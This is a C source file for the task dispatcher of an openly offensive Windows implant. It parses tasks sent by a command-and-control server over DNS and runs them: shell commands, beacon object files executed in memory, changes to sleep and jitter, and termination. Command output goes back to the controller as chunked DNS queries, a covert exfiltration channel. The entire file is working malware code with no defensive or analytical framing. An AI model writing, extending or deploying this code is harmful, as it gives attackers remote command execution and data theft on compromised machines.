/*
 * commands.c - Task dispatcher
 *
 * Parses the task-list payload received from the C2 server and dispatches
 * each task to the appropriate handler.  Output is transmitted back as
 * MSG_OUTPUT DNS queries.
 */

#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#include <windows.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>

#include "protocol.h"
#include "dns.h"
#include "bof_loader.h"

/* Forward declaration of shell_exec from shell.c */
uint8_t *shell_exec(const uint8_t *cmd, size_t cmd_len, size_t *out_len);

/* -----------------------------------------------------------------------
 * send_task_output
 *
 * Transmits task output back to the C2 server as MSG_OUTPUT DNS queries.
 * Splits across multiple queries with incrementing seq if needed.
 *
 * task_id  : 8 bytes of ASCII hex
 * status   : 0=success, 1=error
 * output   : output bytes (may be NULL if output_len=0)
 * output_len: byte count of output
 * ---------------------------------------------------------------------- */
static void send_task_output(const uint8_t *task_id, uint8_t status,
                              const uint8_t *output, size_t output_len,
                              uint8_t msg_type)
{
    /*
     * MSG_OUTPUT data field layout:
     *   [8]  task_id (ASCII hex)
     *   [1]  status
     *   [4]  output_len LE
     *   [N]  output bytes
     *
     * Each DNS query carries msg_type=MSG_OUTPUT and a seq counter.
     * The upstream envelope has a 2-byte data_len field which constrains
     * how much "data" we can fit.  Given the 3-label * 63-char limit
     * (189 base32 chars) → floor(189*5/8) = 118 bytes of XOR'd packet,
     * and the envelope header is 4 bytes, we have 114 bytes of data per
     * query.  The fixed prefix (8+1+4 = 13 bytes) uses 13 of those 114,
     * leaving ~101 bytes of output per query.
     */
    #define OUTPUT_CHUNK 100

    /* Build the fixed header part of the data field */
    uint8_t hdr[13];
    memcpy(hdr, task_id, 8);
    hdr[8] = status;
    write_u32le(hdr + 9, (uint32_t)output_len);

    uint8_t  seq    = 0;
    size_t   offset = 0;          /* current position in output */
    int      done   = 0;

    while (!done) {
        uint8_t buf[256];
        size_t  buf_off = 0;

        if (seq == 0) {
            /* First chunk: include the 13-byte header */
            memcpy(buf, hdr, 13);
            buf_off = 13;
        }

        /* How many output bytes fit in this chunk? */
        size_t remaining   = output_len - offset;
        size_t chunk_space = (seq == 0) ? (OUTPUT_CHUNK - 13) : OUTPUT_CHUNK;

        size_t take = remaining < chunk_space ? remaining : chunk_space;

        if (output && take > 0) {
            memcpy(buf + buf_off, output + offset, take);
            buf_off += take;
            offset  += take;
        }

        if (offset >= output_len) done = 1;

        size_t resp_len;
        uint8_t *resp = dns_query(buf, buf_off, msg_type, seq, &resp_len);
        if (resp) {
            /* We don't act on the response for output ACKs, just free it */
            free(resp);
        }

        seq++;
        if (seq > 254) break; /* safety cap: max ~25 KB output */
    }

    #undef OUTPUT_CHUNK
}

/* -----------------------------------------------------------------------
 * dispatch_tasks
 *
 * data     : raw task-list bytes (resp_type and data_len already stripped)
 * data_len : byte count
 *
 * Task-list format:
 *   [1] num_tasks
 *   for each task:
 *     [8] task_id (ASCII hex)
 *     [1] cmd_type
 *     [4] cmd_data_len LE
 *     [N] cmd_data
 * ---------------------------------------------------------------------- */
void dispatch_tasks(const uint8_t *data, uint16_t data_len) {
    if (!data || data_len < 1) return;

    size_t off = 0;
    uint8_t num_tasks = data[off++];

    for (int t = 0; t < (int)num_tasks; t++) {
        if (off + 8 + 1 + 4 > data_len) break;

        const uint8_t *task_id    = data + off;   off += 8;
        uint8_t        cmd_type   = data[off++];
        uint32_t       cmd_dlen   = read_u32le(data + off); off += 4;

        if (off + cmd_dlen > data_len) break;
        const uint8_t *cmd_data = data + off;
        off += cmd_dlen;

        switch (cmd_type) {

        /* ---- CMD_SHELL ---- */
        case CMD_SHELL: {
            if (cmd_dlen < 2) {
                send_task_output(task_id, 1, (const uint8_t *)"bad cmd", 7, MSG_OUTPUT);
                break;
            }
            uint16_t cmd_len = read_u16le(cmd_data);
            if (2 + (uint32_t)cmd_len > cmd_dlen) {
                send_task_output(task_id, 1, (const uint8_t *)"bad cmd len", 11, MSG_OUTPUT);
                break;
            }
            const uint8_t *cmd_str = cmd_data + 2;

            size_t   out_len = 0;
            uint8_t *output  = shell_exec(cmd_str, (size_t)cmd_len, &out_len);

            if (output) {
                send_task_output(task_id, 0, output, out_len, MSG_OUTPUT);
                HeapFree(GetProcessHeap(), 0, output);
            } else {
                send_task_output(task_id, 1,
                                 (const uint8_t *)"exec failed", 11, MSG_OUTPUT);
            }
            break;
        }

        /* ---- CMD_EXECUTE_BOF ---- */
        case CMD_EXECUTE_BOF: {
            if (cmd_dlen < 4) {
                send_task_output(task_id, 1, (const uint8_t *)"bad bof", 7, MSG_OUTPUT);
                break;
            }
            uint32_t bof_len = read_u32le(cmd_data);
            if (4 + bof_len + 4 > cmd_dlen) {
                send_task_output(task_id, 1,
                                 (const uint8_t *)"bof size err", 12, MSG_OUTPUT);
                break;
            }
            const uint8_t *bof_data = cmd_data + 4;
            uint32_t args_len = read_u32le(cmd_data + 4 + bof_len);
            const uint8_t *bof_args = cmd_data + 4 + bof_len + 4;

            if (4 + bof_len + 4 + args_len > cmd_dlen) {
                send_task_output(task_id, 1,
                                 (const uint8_t *)"args size err", 13, MSG_OUTPUT);
                break;
            }

            size_t   out_len = 0;
            uint8_t *output  = bof_execute(bof_data, (size_t)bof_len,
                                           bof_args,  (size_t)args_len,
                                           &out_len);

            if (output && out_len > 0) {
                send_task_output(task_id, 0, output, out_len, MSG_OUTPUT);
                HeapFree(GetProcessHeap(), 0, output);
            } else {
                if (output) HeapFree(GetProcessHeap(), 0, output);
                send_task_output(task_id, 1,
                                 (const uint8_t *)"bof: no output", 14, MSG_OUTPUT);
            }
            break;
        }

        /* ---- CMD_SLEEP ---- */
        case CMD_SLEEP: {
            if (cmd_dlen < 5) break;
            uint32_t new_sleep = read_u32le(cmd_data);
            uint8_t  new_jit   = cmd_data[4];
            g_sleep_ms   = new_sleep;
            g_jitter_pct = new_jit;
            send_task_output(task_id, 0, (const uint8_t *)"ok", 2, MSG_OUTPUT);
            break;
        }

        /* ---- CMD_TERMINATE ---- */
        case CMD_TERMINATE: {
            send_task_output(task_id, 0, (const uint8_t *)"bye", 3, MSG_OUTPUT);
            ExitProcess(0);
            break; /* unreachable */
        }

        default:
            send_task_output(task_id, 1,
                             (const uint8_t *)"unknown cmd", 11, MSG_OUTPUT);
            break;
        }
    }
}
